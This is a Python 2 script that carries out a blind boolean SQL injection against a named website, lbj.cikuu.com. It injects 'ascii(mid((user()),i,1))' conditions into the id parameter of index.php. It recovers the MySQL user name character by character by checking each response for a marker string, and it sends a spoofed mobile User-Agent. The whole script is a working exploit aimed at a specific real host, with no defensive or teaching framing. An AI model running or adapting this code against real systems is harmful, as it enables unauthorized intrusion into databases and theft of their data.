#encoding=utf-8



import httplib



import time



import string



import sys



import random



import urllib







headers = {



    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',



}







payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')









print 'start to retrive MySQL user:'



user = ''



for i in range(1,15,1):



    for payload in payloads:





        conn = httplib.HTTPConnection('lbj.cikuu.com', timeout=60)



        s = "ascii(mid((user()),%s,1))=%s" % (i, ord(payload))

        

        conn.request(method='GET',



                     url="/index.php?a=arcon&id=-1 OR " + s + "&m=Index",

                     

                     headers = headers)



        html_doc = conn.getresponse().read()

        conn.close()

        

       

        

        if html_doc.find('2014') > 0:



            user += payload



            sys.stdout.write('\r[In progress] %s' % user)



            sys.stdout.flush()



            break



        else:



            print '.',







print '\n[Done]MySQL user is', user